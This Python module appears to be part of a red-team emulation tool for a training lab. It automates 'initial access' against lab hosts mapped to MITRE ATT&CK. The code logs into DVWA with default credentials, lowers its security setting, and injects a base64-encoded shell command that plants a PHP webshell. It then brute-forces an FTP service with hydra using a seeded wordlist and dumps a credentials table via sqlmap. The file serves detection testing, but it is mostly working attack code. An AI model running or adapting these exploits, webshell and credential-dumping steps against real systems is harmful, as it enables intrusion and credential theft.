"""
act2_access.py — Act 2: Initial Access.

Tactic mapping (MITRE ATT&CK):
  T1190      Exploit Public-Facing Application
  T1110.001  Brute Force :: Password Guessing
  T1078      Valid Accounts

Preconditions: Act 1 has populated `hosts` with at least srv-web (DVWA) and
srv-ftp visible. If those rows are absent we tell the operator to run Act 1.

What this act actually does:
  Step 1 — Exploit DVWA Command Injection to drop a webshell on srv-web.
           Webshell is a single-file PHP that takes ?cmd=... and returns
           the command output. We register the webshell URL in artifacts.
  Step 2 — Hydra brute-force the FTP service on srv-ftp. Wordlist is
           targeted: known seeded password + common patterns. In a real
           attack the wordlist would be larger (rockyou.txt), but the
           protocol behavior (and Suricata signatures) are identical.
  Step 3 — Use DVWA credentials (admin/password — DVWA default) to reach
           MySQL through the SQL Injection page, dump infra_credentials.
           The dumped rows feed Act 3's cred-reuse pivots.

Detection expectations (defender side):
  T1190     → Suricata ET WEB_SPECIFIC_APPS DVWA, Wazuh web access log spike,
              Apache 200 responses on /vulnerabilities/exec/ with shell metachars
  T1110.001 → Suricata ET SCAN ftp, Wazuh authentication failures on srv-ftp
  T1078     → MySQL general log (if enabled), Wazuh process audit on srv-sql
"""

from __future__ import annotations

import re
import shlex
import urllib.parse
from pathlib import Path

from ..actor import ActorProfile, inter_step_pause
from ..menu import display_act_menu, prompt_yes_no, render_status_line
from ..runner import C, FailureDecision, Outcome, Runner, colour
from ..state import StateManager


ACT_NAME = "access"

# DVWA defaults (DVWA's built-in admin account, NOT the MySQL credential).
DVWA_BASE = "http://10.50.0.12/dvwa"
DVWA_USER = "admin"
DVWA_PASS = "password"

WEBSHELL_NAME = "sentinel_shell.php"
WEBSHELL_REMOTE_PATH = f"/var/www/html/dvwa/hackable/uploads/{WEBSHELL_NAME}"
WEBSHELL_URL = f"{DVWA_BASE}/hackable/uploads/{WEBSHELL_NAME}"

# Minimal webshell. Plain PHP. Reads ?cmd= and returns the output verbatim.
# This is intentionally trivial — readable for the supervisor demo, and
# detected by every IDS signature for PHP webshells.
WEBSHELL_PHP = (
    "<?php if(isset($_GET[\"cmd\"])){echo \"<pre>\";"
    "system($_GET[\"cmd\"]);echo \"</pre>\";} ?>"
)


# ─── Menu definition ────────────────────────────────────────────────

ACT_OPTIONS = [
    ("1", "T1190      Exploit DVWA (cmd injection → drop webshell)"),
    ("2", "T1110.001  Brute force srv-ftp (hydra → Louay-Windows)"),
    ("3", "T1078      Dump infra_credentials via SQLi (sqlmap)"),
]


# ─── Step 1: DVWA exploit → webshell ────────────────────────────────

def step_dvwa_exploit(runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    """
    T1190 — DVWA Command Injection. Two phases:
      (a) authenticate to DVWA, capture session cookie + CSRF token
      (b) submit a payload that drops sentinel_shell.php in /uploads
    """
    cookie_jar = runner.run_dir / "dvwa_cookies.txt"
    cookie_jar_arg = str(cookie_jar)

    # ── (a) Login to DVWA. We need a session cookie AND the user_token. ──
    # First GET the login page to seed the cookie and read the user_token.
    while True:
        r_login_get = runner.run(
            act=ACT_NAME, technique="T1190", tool="curl",
            argv=[
                "curl", "-sS",
                "-c", cookie_jar_arg, "-b", cookie_jar_arg,
                "-A", profile.user_agent,
                *profile.curl_extra_flags,
                f"{DVWA_BASE}/login.php",
            ],
            target_host="10.50.0.12", timeout=30,
        )
        if r_login_get.outcome == Outcome.SUCCESS:
            break
        if r_login_get.decision == FailureDecision.RETRY:
            continue
        if r_login_get.decision == FailureDecision.QUIT:
            raise KeyboardInterrupt
        return False

    token_match = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([0-9a-f]+)['\"]",
                            r_login_get.stdout, re.IGNORECASE)
    if not token_match:
        print(colour("  (!) could not find user_token in DVWA login page", C.RED))
        return False
    user_token = token_match.group(1)
    print(colour(f"  → got DVWA login token: {user_token[:16]}...", C.DIM))

    # POST login.
    inter_step_pause(profile)
    while True:
        r_login_post = runner.run(
            act=ACT_NAME, technique="T1190", tool="curl",
            argv=[
                "curl", "-sS",
                "-c", cookie_jar_arg, "-b", cookie_jar_arg,
                "-A", profile.user_agent,
                *profile.curl_extra_flags,
                "-L",
                "-d", f"username={DVWA_USER}&password={DVWA_PASS}"
                      f"&user_token={user_token}&Login=Login",
                f"{DVWA_BASE}/login.php",
            ],
            target_host="10.50.0.12", timeout=30,
        )
        if r_login_post.outcome == Outcome.SUCCESS:
            break
        if r_login_post.decision == FailureDecision.RETRY:
            continue
        if r_login_post.decision == FailureDecision.QUIT:
            raise KeyboardInterrupt
        return False

    # Lower the DVWA security to 'low' (it's a teaching app — the operator
    # would normally set this in the UI; we do it via the security page).
    inter_step_pause(profile)
    runner.run(
        act=ACT_NAME, technique="T1190", tool="curl",
        argv=[
            "curl", "-sS",
            "-c", cookie_jar_arg, "-b", cookie_jar_arg,
            "-A", profile.user_agent,
            *profile.curl_extra_flags,
            "-d", f"security=low&seclev_submit=Submit&user_token={user_token}",
            f"{DVWA_BASE}/security.php",
        ],
        target_host="10.50.0.12", timeout=30,
    )

    # ── (b) Drop the webshell via the command injection page. ──
    # The page expects an IP for `ping`. We append shell metacharacters.
    # Payload writes our PHP shell to the uploads directory.
    php_b64 = _b64(WEBSHELL_PHP)
    payload = (
        f"127.0.0.1; echo {php_b64} | base64 -d > {WEBSHELL_REMOTE_PATH}; "
        f"chmod 644 {WEBSHELL_REMOTE_PATH}; "
        f"ls -la {WEBSHELL_REMOTE_PATH}"
    )

    inter_step_pause(profile)
    while True:
        r_inject = runner.run(
            act=ACT_NAME, technique="T1190", tool="curl",
            argv=[
                "curl", "-sS",
                "-c", cookie_jar_arg, "-b", cookie_jar_arg,
                "-A", profile.user_agent,
                *profile.curl_extra_flags,
                "-d", "ip=" + urllib.parse.quote(payload) + "&Submit=Submit",
                f"{DVWA_BASE}/vulnerabilities/exec/",
            ],
            target_host="10.50.0.12", timeout=30,
        )
        if r_inject.outcome == Outcome.SUCCESS:
            break
        if r_inject.decision == FailureDecision.RETRY:
            continue
        if r_inject.decision == FailureDecision.QUIT:
            raise KeyboardInterrupt
        return False

    # Verify the webshell exists and is callable.
    inter_step_pause(profile)
    r_verify = runner.run(
        act=ACT_NAME, technique="T1190", tool="curl",
        argv=[
            "curl", "-sS",
            "-A", profile.user_agent,
            *profile.curl_extra_flags,
            f"{WEBSHELL_URL}?cmd=id",
        ],
        target_host="10.50.0.12", timeout=15,
    )

    if r_verify.outcome == Outcome.SUCCESS and "uid=" in r_verify.stdout:
        print(colour(f"  ✓ webshell live: {WEBSHELL_URL}?cmd=...", C.GREEN, C.BOLD))
        state.upsert_host(
            run_id=runner.run_id, ip="10.50.0.12", hostname="srv-web",
            compromise_status="pwned", shell_method="webshell",
            notes=f"webshell at {WEBSHELL_URL}",
        )
        state.add_artifact(
            run_id=runner.run_id, source_host="srv-web",
            artifact_type="webshell", description=f"PHP webshell at {WEBSHELL_URL}",
            local_path=str(runner.run_dir / "webshell_url.txt"),
            size_bytes=len(WEBSHELL_PHP),
        )
        (runner.run_dir / "webshell_url.txt").write_text(WEBSHELL_URL + "\n")
        return True

    print(colour("  (!) webshell verification failed — payload may not have landed",
                 C.YELLOW))
    return False


def _b64(s: str) -> str:
    import base64
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


# ─── Step 2: Hydra brute force srv-ftp ──────────────────────────────

def step_ftp_brute(runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    """
    T1110.001 — Targeted hydra brute force against srv-ftp.

    Username list = {Louay-Windows, Administrator, ftp, anonymous}.
    Password list = small targeted dictionary that includes the seeded
    password (Louay2002). See SUPERVISOR_GUIDE for the honest framing.
    """
    target_ip = "10.50.0.14"
    user_file = runner.run_dir / "ftp_users.txt"
    pass_file = runner.run_dir / "ftp_passwords.txt"

    user_file.write_text(
        "Louay-Windows\n"
        "Administrator\n"
        "ftp\n"
        "anonymous\n"
    )
    # Targeted wordlist: real seeded passwords + plausible patterns + decoys.
    pass_file.write_text(
        "password\n"
        "123456\n"
        "admin\n"
        "Louay2002\n"          # the actual seeded password
        "Welcome2024!\n"
        "Summer2024!\n"
        "BackupP@ss2024!\n"
        "P@ssw0rd\n"
        "ftp\n"
        "Administrator\n"
    )

    extra = ["-t", str(profile.hydra_threads)]
    if profile.hydra_wait_per_try > 0:
        extra += ["-W", str(profile.hydra_wait_per_try)]

    while True:
        result = runner.run(
            act=ACT_NAME, technique="T1110.001", tool="hydra",
            argv=[
                "hydra", *extra,
                "-L", str(user_file), "-P", str(pass_file),
                "-f",                     # stop after first success per host
                "-o", str(runner.run_dir / "hydra_ftp_results.txt"),
                target_ip, "ftp",
            ],
            target_host=target_ip, timeout=900,
            success_when_rc_in=(0,),
            treat_rc_as_partial=(1, 255),
        )

        # hydra writes successful pairs to the -o file.
        results_file = runner.run_dir / "hydra_ftp_results.txt"
        if results_file.is_file():
            for line in results_file.read_text().splitlines():
                m = re.match(r"^\[ftp\]\[ftp\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(.+)$",
                             line)
                if m:
                    state.add_credential(
                        run_id=runner.run_id, source="brute_force",
                        source_host=target_ip, system="srv-ftp", service="ftp",
                        username=m.group(2), password=m.group(3),
                        verified=1,
                    )
                    print(colour(
                        f"  ✓ cracked FTP cred: {m.group(2)}:{m.group(3)}",
                        C.GREEN, C.BOLD))

        if result.outcome in (Outcome.SUCCESS, Outcome.PARTIAL):
            return True
        if result.decision == FailureDecision.RETRY:
            continue
        if result.decision == FailureDecision.QUIT:
            raise KeyboardInterrupt
        return False


# ─── Step 3: SQLi via sqlmap to dump infra_credentials ──────────────

def step_dump_credentials(runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    """
    T1078 / T1190 — Use authenticated DVWA session + sqlmap against the
    SQL Injection page to dump the seeded infra_credentials table.

    The DVWA dvwa MySQL user was granted SELECT on infra_credentials by
    the seed playbook, so the SQLi chain reaches the table successfully.
    """
    cookie_jar = runner.run_dir / "dvwa_cookies.txt"
    if not cookie_jar.is_file():
        print(colour("  (!) no DVWA session cookie — run step 1 first", C.YELLOW))
        return False

    # Extract PHPSESSID + security cookie values from the curl jar.
    cookies = _read_curl_cookies(cookie_jar)
    cookie_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
    if "PHPSESSID" not in cookies:
        print(colour("  (!) PHPSESSID missing from DVWA cookie jar", C.YELLOW))
        return False

    target_url = f"{DVWA_BASE}/vulnerabilities/sqli/?id=1&Submit=Submit"

    while True:
        result = runner.run(
            act=ACT_NAME, technique="T1078", tool="sqlmap",
            argv=[
                "sqlmap",
                "--url", target_url,
                "--cookie", cookie_header,
                "--user-agent", profile.user_agent,
                "--batch",                       # never prompt
                "--level", "2",
                "--risk", "1",
                "--threads", "1" if profile.name == "apt" else "4",
                "--dbms", "MySQL",
                "-D", "dvwa", "-T", "infra_credentials", "--dump",
                "--output-dir", str(runner.run_dir / "sqlmap"),
            ],
            target_host="10.50.0.12", timeout=900,
            success_when_rc_in=(0,),
            treat_rc_as_partial=(1,),
        )

        # sqlmap writes the dumped table to <output-dir>/<host>/dump/<db>/<table>.csv
        dump_csv = next(
            (runner.run_dir / "sqlmap").rglob("infra_credentials.csv"),
            None,
        )
        if dump_csv and dump_csv.is_file():
            _ingest_sqlmap_dump(state, runner.run_id, dump_csv)
            state.add_artifact(
                run_id=runner.run_id, source_host="srv-web",
                artifact_type="cred_dump",
                description="infra_credentials table dumped via SQLi",
                local_path=str(dump_csv),
                size_bytes=dump_csv.stat().st_size,
            )

        if result.outcome in (Outcome.SUCCESS, Outcome.PARTIAL):
            return True
        if result.decision == FailureDecision.RETRY:
            continue
        if result.decision == FailureDecision.QUIT:
            raise KeyboardInterrupt
        return False


def _read_curl_cookies(jar: Path) -> dict[str, str]:
    """Parse the Netscape-format cookie jar that `curl -c` writes."""
    result: dict[str, str] = {}
    for line in jar.read_text().splitlines():
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            result[parts[5]] = parts[6]
    return result


def _ingest_sqlmap_dump(state: StateManager, run_id: str, csv_path: Path) -> None:
    """
    Read sqlmap's CSV dump of infra_credentials and stash each row in the
    credentials table with source='sqli_dump'.
    """
    import csv
    with csv_path.open(newline="") as fh:
        reader = csv.DictReader(fh)
        count = 0
        for row in reader:
            # sqlmap column names match what we seeded.
            state.add_credential(
                run_id=run_id, source="sqli_dump", source_host="srv-web",
                system=row.get("system_name"), service=row.get("service"),
                username=row.get("username"), password=row.get("password"),
                verified=0,
            )
            count += 1
    print(colour(f"  ✓ ingested {count} credentials from SQLi dump", C.GREEN, C.BOLD))


# ─── Dispatcher / Run ALL ───────────────────────────────────────────

STEPS = {
    "1": ("DVWA exploit (webshell)",        step_dvwa_exploit),
    "2": ("FTP brute force",                step_ftp_brute),
    "3": ("SQLi dump infra_credentials",    step_dump_credentials),
}


def run_one(key: str, runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    label, fn = STEPS[key]
    print(colour(f"\n──── Act 2 :: {label} ────", C.MAGENTA, C.BOLD))
    return fn(runner, profile, state)


def run_all(runner: Runner, profile: ActorProfile, state: StateManager) -> None:
    for k in sorted(STEPS):
        try:
            run_one(k, runner, profile, state)
        except KeyboardInterrupt:
            print(colour("\n  (interrupted — returning to main menu)", C.YELLOW))
            return
        inter_step_pause(profile)


def loop(runner: Runner, profile: ActorProfile, state: StateManager) -> None:
    # Sanity check: Act 1 must have populated some hosts.
    if not state.hosts_for_run(runner.run_id):
        print(colour(
            "\n  (!) No hosts in state — run Act 1 first or you'll attack the void.",
            C.YELLOW))
        if not prompt_yes_no("Proceed anyway?", default=False):
            return

    while True:
        render_status_line(state, runner.run_id)
        choice = display_act_menu("Act 2 :: Initial Access", ACT_OPTIONS)
        if choice == "b":
            return
        if choice == "a":
            run_all(runner, profile, state)
            if prompt_yes_no("Continue to Act 3?", default=True):
                return
            continue
        try:
            run_one(choice, runner, profile, state)
        except KeyboardInterrupt:
            print(colour("\n  (interrupted — back to act menu)", C.YELLOW))
